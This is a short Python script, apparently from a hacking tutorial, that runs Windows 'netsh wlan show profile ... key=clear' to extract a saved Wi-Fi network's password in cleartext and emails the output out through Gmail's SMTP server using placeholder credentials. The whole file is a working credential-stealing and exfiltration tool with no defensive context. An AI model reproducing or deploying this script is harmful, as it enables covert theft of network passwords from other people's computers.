#! /usr/bin/env python

import subprocess,smtplib

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587) #create a smtp sevrer
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)#from ,to, message
    server.quit()
    
command="netsh wlan show profile Bhramhasmi key=clear"
result= subprocess.check_output(command, shell=True)
send_mail("email@gmail.com","password",result)

